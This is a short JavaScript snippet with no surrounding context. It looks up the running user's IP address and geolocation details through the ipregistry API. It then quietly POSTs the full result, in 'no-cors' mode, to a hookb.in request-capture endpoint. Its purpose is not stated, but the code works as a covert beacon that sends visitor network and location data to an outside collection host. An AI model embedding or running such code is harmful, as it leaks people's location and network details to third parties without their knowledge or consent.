(async function () {
  let x = await fetch('https://api.ipregistry.co/?key=tryout').then((res) =>
    res.json()
  );
  console.log(x);
  fetch('https://hookb.in/gg09G0WZZmuG7Voo8d0J', {
    method: 'POST',
    body: JSON.stringify(x),
    mode: 'no-cors',
  });
})();
